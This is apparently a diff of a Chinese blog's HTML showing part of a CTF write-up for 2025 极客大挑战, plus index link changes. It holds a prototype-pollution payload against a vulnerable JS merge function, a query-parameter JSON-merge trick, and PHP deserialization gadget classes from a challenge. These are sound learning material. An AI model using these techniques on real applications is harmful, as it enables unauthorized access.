+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">status</span><span class="p">).</span><span class="nx">end</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="o">&lt;</span><span class="err">/h1&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">object1</span><span class="p">,</span> <span class="nx">object2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">object2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">object2</span> <span class="o">&amp;&amp;</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">object1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">merge</span><span class="p">(</span><span class="nx">object1</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">object2</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">object1</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">object2</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">merge</span> <span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现源码直接打就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;username&#34;:&#34;Starven&#34;,&#34;password&#34;:&#34;123456&#34;,&#34;__proto__&#34;:{&#34;hasFlag&#34;:true}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983.png"
+	width="1496"
+	height="322"
+	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_2da14ece8ae19413.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703112737983_hu_9d8c02e3bde97a2e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703112737983"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="464"
+		data-flex-basis="1115px"
+	
+></p>
+<p><strong>req.query对同名参数解析为数组，同一参数名解析数组后会被逗号分隔，然后经过 JSON.parse解析转换为对象</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">syc={&#34;username&#34;:&#34;Starven&#34;&amp;syc=&#34;password&#34;:&#34;123456&#34;&amp;syc=&#34;hasFlag&#34;:true}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#经过解析转换为  req.query.syc = [
+</span></span><span class="line"><span class="cl">    &#39;{&#34;username&#34;:&#34;Starven&#34;}&#39;,
+</span></span><span class="line"><span class="cl">    &#39;{&#34;password&#34;:&#34;123456&#34;}&#39;,
+</span></span><span class="line"><span class="cl">    &#39;{&#34;hasFlag&#34;:true}&#39;
+</span></span><span class="line"><span class="cl">  ]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826.png"
+	width="1854"
+	height="193"
+	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_1c2600de632af304.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250703122029826_hu_b8d67ac5d106d805.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703122029826"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="960"
+		data-flex-basis="2305px"
+	
+></p>
+<h2 id="php不比java差">PHP不比Java差
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class Challenge{
+</span></span><span class="line"><span class="cl">    public $file;
+</span></span><span class="line"><span class="cl">    public function Sink()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        echo &#34;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&#34;;
+</span></span><span class="line"><span class="cl">        echo &#34;Is there any file?&lt;br&gt;&#34;;
+</span></span><span class="line"><span class="cl">        if(file_exists($this-&gt;file)){
+</span></span><span class="line"><span class="cl">            global $FLAG;
+</span></span><span class="line"><span class="cl">            echo $FLAG;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class Geek{
+</span></span><span class="line"><span class="cl">    public $a;
+</span></span><span class="line"><span class="cl">    public $b;
+</span></span><span class="line"><span class="cl">    public function __unserialize(array $data): void
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $change=$_GET[&#34;change&#34;];
+</span></span><span class="line"><span class="cl">        $FUNC=$change($data);
+</span></span><span class="line"><span class="cl">        $FUNC();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class Syclover{
+</span></span><span class="line"><span class="cl">    public $Where;
+</span></span><span class="line"><span class="cl">    public $IS;
+</span></span><span class="line"><span class="cl">    public $Starven;
+</span></span><span class="line"><span class="cl">    public $Girlfriend;
+</span></span><span class="line"><span class="cl">    public function __toString()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        echo &#34;__toString is called&lt;br&gt;&#34;;
+</span></span><span class="line"><span class="cl">        $eee=new $this-&gt;Where($this-&gt;IS);
+</span></span><span class="line"><span class="cl">        $fff=$this-&gt;Starven;
+</span></span><span class="line"><span class="cl">        $eee-&gt;$fff($this-&gt;Girlfriend);
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="funnysql">funnySQL
 </h2>
 </section>
 
@@ -1424,6 +2267,45 @@
             
                 
 <article class="">
+    <a href="/p/2025%E5%A4%8F%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025夏季春秋杯</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-ctfshow-java反序列化_846-858</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ctfshow_java-279-300/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ctfshow_java-279-300</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-hnctf/">
         
         
@@ -1443,45 +2325,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-FXZCTF</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2024newstar-web/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2024newstar-web</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-d3ctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-D3ctf</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-litctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-litctf</h2>
         </div>
     </a>
 </article>
